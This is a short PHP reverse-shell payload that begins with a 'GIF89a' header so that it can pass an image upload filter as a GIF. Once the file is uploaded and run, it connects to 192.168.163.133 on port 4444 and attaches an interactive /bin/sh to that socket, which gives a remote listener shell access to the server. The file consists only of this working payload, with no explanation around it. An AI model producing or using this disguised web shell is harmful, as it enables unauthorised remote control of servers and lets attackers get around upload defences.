GIF89a;
<?php
set_time_limit(0);
$ip = '192.168.163.133';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
